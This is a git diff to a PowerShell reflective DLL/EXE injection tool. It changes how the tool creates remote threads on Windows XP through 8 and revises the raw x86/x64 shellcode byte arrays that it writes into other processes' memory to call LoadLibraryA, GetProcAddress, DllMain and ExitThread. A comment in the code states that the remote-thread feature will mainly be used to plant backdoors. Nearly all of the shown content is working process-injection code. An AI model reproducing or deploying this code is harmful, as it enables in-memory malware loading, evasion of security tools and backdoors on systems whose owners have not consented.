@@ -1,5 +1,4 @@
-﻿
-<#
+﻿<#
 .SYNOPSIS
 
 Reflectively loads a DLL or EXE in to memory of the Powershell process.
@@ -483,6 +482,21 @@ $RemoteScriptBlock = {
 		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
 		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES
+		
+		#Struct NtCreateThreadExBuffer32
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('NtCreateThreadExBuffer32', $Attributes, [System.ValueType], 36)
+		$TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown1', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown2', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown3', [IntPtr], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown4', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown5', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown6', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown7', [IntPtr], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Unknown8', [UInt32], 'Public') | Out-Null
+		$NtCreateThreadExBuffer32 = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name NtCreateThreadExBuffer32 -Value $NtCreateThreadExBuffer32
 		
 		return $Win32Types
 	}
@@ -1016,20 +1030,27 @@ $RemoteScriptBlock = {
 		[IntPtr]
 		$StartAddress,
 		
-		[Parameter(Position = 3, Mandatory = $true)]
+		[Parameter(Position = 3, Mandatory = $false)]
+		[IntPtr]
+		$ArgumentPtr = [IntPtr]::Zero,
+		
+		[Parameter(Position = 4, Mandatory = $true)]
 		[System.Object]
-		$Win32Functions
+		$Win32Functions,
+		
+		[Parameter(Position = 5, Mandatory = $true)]
+		[System.Object]
+		$Win32Types
 		)
 		
 		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
 		
 		$OSVersion = [Environment]::OSVersion.Version
-		Write-Verbose "todo $OSVersion"
 		#Vista and Win7
 		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
 		{
-			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx"
-			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
+			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
+			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
 			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
 			{
@@ -1039,7 +1060,43 @@ $RemoteScriptBlock = {
 		#XP/Win8
 		else
 		{
-			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $StartAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
+			if ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -eq 8)
+			{
+				$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
+			}
+			else
+			{
+				#todo delete all this and remove win32types from function
+#				$BufferSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.NtCreateThreadExBuffer32)
+#				$NtCreateThreadExBufferPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BufferSize)
+#				$NtCreateThreadExBuffer = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtCreateThreadExBufferPtr, $Win32Types.NtCreateThreadExBuffer32)
+#				
+#				[UInt32]$Temp1 = 0
+#				[UInt32]$Temp2 = 0
+#				[IntPtr]$Temp1Ptr = [IntPtr]::Zero
+#				[IntPtr]$Temp2Ptr = [IntPtr]::Zero
+#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Temp1, $Temp1Ptr, $false)
+#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Temp2, $Temp2Ptr, $false)
+#				$NtCreateThreadExBuffer.Size = [UInt32]$BufferSize
+#				$NtCreateThreadExBuffer.Unknown1 = 0x10003
+#				$NtCreateThreadExBuffer.Unknown2 = 0x8
+#				$NtCreateThreadExBuffer.Unknown3 = $Temp1Ptr
+#				$NtCreateThreadExBuffer.Unknown4 = 0
+#				$NtCreateThreadExBuffer.Unknown5 = 0x10004
+#				$NtCreateThreadExBuffer.Unknown6 = 4
+#				$NtCreateThreadExBuffer.Unknown7 = $Temp2Ptr
+#				$NtCreateThreadExBuffer.Unknown8 = 0
+#				
+#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NtCreateThreadExBuffer, $NtCreateThreadExBufferPtr, $true)
+#				
+				$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
+			}
+		}
+		
+		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
+		{
+			Write-Verbose "Error creating remote thread, thread handle is null"
 		}
 		
 		return $RemoteThreadHandle
@@ -1309,17 +1366,11 @@ $RemoteScriptBlock = {
 			}
 			
 			
-			#Write Shellcode to the remote process which will call LoadLibraryA
-			if ($PEInfo.PE64Bit -eq $true)
-			{
-				$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
-				$LoadLibrarySC2 = @(0x48, 0xba)
-				$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
-				$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
-			}
-			else
-			{
-			}
+			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
+			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
+			$LoadLibrarySC2 = @(0x48, 0xba)
+			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
+			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
 			
 			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
 			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
@@ -1353,8 +1404,7 @@ $RemoteScriptBlock = {
 				Throw "Unable to write shellcode to remote process memory."
 			}
 			
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
-			#tododelete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1375,8 +1425,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -Win32Functions $Win32Functions
-			#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $LoadLibraryAAddr, $RImportDllPathPtr, 0, [IntPtr]::Zero)
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions -Win32Types $Win32Types
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1385,7 +1434,7 @@ $RemoteScriptBlock = {
 			
 			[Int32]$ExitCode = 0
 			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
-			if ($Result -eq 0)
+			if (($Result -eq 0) -or ($ExitCode -eq 0))
 			{
 				Throw "Call to GetExitCodeThread failed"
 			}
@@ -1452,11 +1501,12 @@ $RemoteScriptBlock = {
 		
 		
 		#Write Shellcode to the remote process which will call GetProcAddress
+		#Shellcode: GetProcAddress.asm
 		#todo: need to have detection for when to get by ordinal
 		[Byte[]]$GetProcAddressSC = @()
 		if ($PEInfo.PE64Bit -eq $true)
 		{
-			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
 			$GetProcAddressSC2 = @(0x48, 0xba)
 			$GetProcAddressSC3 = @(0x48, 0xb8)
 			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
@@ -1464,7 +1514,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x81, 0xe4, 0x00, 0xff, 0xff, 0xff, 0xb8)
+			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
 			$GetProcAddressSC2 = @(0xb9)
 			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
 			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
@@ -1505,7 +1555,7 @@ $RemoteScriptBlock = {
 			Throw "Unable to write shellcode to remote process memory."
 		}
 		
-		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
 		#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 		if ($Result -ne 0)
@@ -2119,15 +2169,15 @@ $RemoteScriptBlock = {
 		foreach ($ProcExitFunctionAddr in $ExitFunctions)
 		{
 			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
-			#The following is the shellcode :
+			#The following is the shellcode (Shellcode: ExitThread.asm):
 			#32bit shellcode
 			[Byte[]]$Shellcode1 = @(0xbb)
-			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x66, 0x81, 0xe4, 0x00, 0xff, 0xbb)
-			#64bit shellcode
+			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
+			#64bit shellcode (Shellcode: ExitThread.asm)
 			if ($PtrSize -eq 8)
 			{
 				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
-				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x81, 0xe4, 0x00, 0xff, 0x48, 0xbb)
+				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
 			}
 			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
 			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
@@ -2462,13 +2512,15 @@ $RemoteScriptBlock = {
 			
 				if ($PEInfo.PE64Bit -eq $true)
 				{
+					#Shellcode: CallDllMain.asm
 					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
 					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
 					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
 				}
 				else
 				{
-					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x81, 0xe4, 0x00, 0xff, 0xff, 0xff, 0xb9)
+					#Shellcode: CallDllMain.asm
+					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
 					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
 					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
 				}
@@ -2500,7 +2552,7 @@ $RemoteScriptBlock = {
 					Throw "Unable to write shellcode to remote process memory."
 				}
 
-				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
 				#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 				if ($Result -ne 0)
@@ -2743,7 +2795,7 @@ $RemoteScriptBlock = {
 			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 			
 			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
 			#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]$VoidFuncAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 		}
 		
